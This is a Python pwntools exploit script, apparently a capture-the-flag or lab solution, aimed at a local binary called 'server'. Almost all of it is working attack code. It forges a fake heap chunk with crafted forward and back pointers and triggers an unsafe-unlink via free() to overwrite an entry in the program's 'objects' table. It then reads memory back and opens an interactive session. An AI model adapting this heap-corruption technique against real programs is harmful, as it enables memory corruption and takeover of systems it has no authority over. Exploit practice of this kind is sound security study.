#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template server
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'server')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return remote('localhost', 10000)
    
# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# FORTIFY:  Enabled

import time

def newObj():
    io.sendline(b'ne')
    time.sleep(0.01)
    x = io.recvline()
    spl = x.split(b"\t")
    return spl[0], int(spl[1], 16)

def newSec():
    io.sendline(b'ns')
    time.sleep(0.01)
    x = io.recvline()
    spl = x.split(b"\t")
    return spl[0], int(spl[1], 16)

def set(pos, content):
    payload = b's' + pos + b'=' + content
    io.sendline(payload)
    time.sleep(0.01)

def get(pos):
    payload = b'g' + pos
    io.sendline(payload)
    time.sleep(0.01)
    return io.recvline()

def free(pos):
    payload = b'd' + pos
    io.sendline(payload)
    time.sleep(0.01)


io = start()
io.recvline()

cpos, cptr = newSec()
apos, aptr = newObj()
bpos, bptr = newObj()

# thing to see in gdb should see ....000100
print("ow", hex(bptr-8))
fakesize = 224

tochange = exe.sym["objects"] + int(cpos, 10) * 16 + 8

print("aptr", hex(aptr))
print("tochange", hex(tochange))

payload = flat({
    # fd->bk # tochange - 16
    240 - fakesize + 8: tochange - 24, 
    # bk
    240 - fakesize + 16 : aptr+1,
    240-8: fakesize,
    # 240 : 0x00
})

spl = payload.split(b'\x00')

log.info("before payload")

for x in spl:
    set(apos, x)

log.info("after payload")

log.info("unlink")

ui.pause()
# gdb: x/20gx 0x406968 - 10*8 # tochange - something to show around
free(bpos)
ui.pause()
# gdb: x/20gx 0x406968 - 10*8 # tochange - something to show around

x = get(cpos)
print(x)

io.interactive()

# x = get(x_pos)
# print(x)


